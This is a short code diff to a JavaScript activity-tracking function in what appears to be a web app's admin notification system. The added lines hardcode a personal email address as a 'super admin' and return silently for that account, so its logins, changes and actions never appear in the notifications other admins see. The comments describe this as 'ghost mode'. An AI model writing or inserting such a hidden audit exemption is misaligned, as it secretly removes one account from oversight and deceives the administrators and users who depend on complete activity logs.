@@ -113,6 +113,7 @@ export async function saveAdminNotificationPreferences(adminEmail, preferences) 
 
 /**
  * Track activity and notify admins
+ * Note: Super admin activities are NEVER logged - they are invisible to other admins
  */
 export async function trackActivity({
   category,
@@ -124,6 +125,15 @@ export async function trackActivity({
   priority = 'normal', // 'low', 'normal', 'high'
 }) {
   try {
+    const SUPER_ADMIN_EMAIL = 'ellines.haven@gmail.com';
+    
+    // FILTER: Super admin activities are NOT tracked/visible
+    // Super admin is a ghost - no one sees their login, changes, or actions
+    if (userEmail && userEmail.toLowerCase() === SUPER_ADMIN_EMAIL.toLowerCase()) {
+      console.log('[trackActivity] Super admin activity blocked from notifications (ghost mode)', title);
+      return null; // Silent return - no notification created
+    }
+    
     const notificationId = `notif_${Date.now()}_${Math.random().toString(36).substr(2, 9)}`;
     
     const notificationData = {
